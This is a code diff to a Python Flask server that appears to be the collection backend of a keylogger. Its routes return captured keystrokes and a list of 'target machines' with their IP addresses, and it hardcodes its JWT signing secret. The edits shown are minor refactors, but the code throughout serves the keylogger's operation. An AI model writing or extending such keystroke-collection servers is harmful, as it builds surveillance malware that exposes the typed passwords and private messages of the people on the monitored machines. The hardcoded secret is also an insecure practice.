@@ -1,13 +1,13 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify,make_response
 from flask_cors import CORS
 from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, JWTManager
-import os, random,string,time, json
+import os, random,string,datetime, json
 from ToolBox import merge_dicts,decrypt
 
 app = Flask(__name__)
 CORS(app,supports_credentials=True)
 app.config['JWT_SECRET_KEY'] = 'q6Nj+unD<gn1*[>J+H!0hO[;rm_Xa'
-app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(hours=1) 
+app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(hours=1)
 jwt = JWTManager(app)
 
 DATA_FOLDER = "logs"
@@ -114,9 +114,9 @@ def get_keystrokes():
 
         with open(file_path, 'r',encoding='utf-8') as f:
             try:
-                key_logs = json.load(f)
+                list_key_logs = json.load(f)
 
-            except Exception as e:
+            except Exception:
                 return jsonify({"error":"logs not found"}),400
 
 
@@ -135,12 +135,12 @@ def get_target_machines_list():
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
             machines = {sn: machine_data['ip'] for sn, machine_data in data.items()}
-    except Exception as e:
+    except Exception:
         machines = {}
 
     try:
         return jsonify(machines), 200
-    except Exception as e:
+    except Exception:
         return jsonify({"error": "server error"}), 500
 
 @app.route('/login', methods=['POST'])
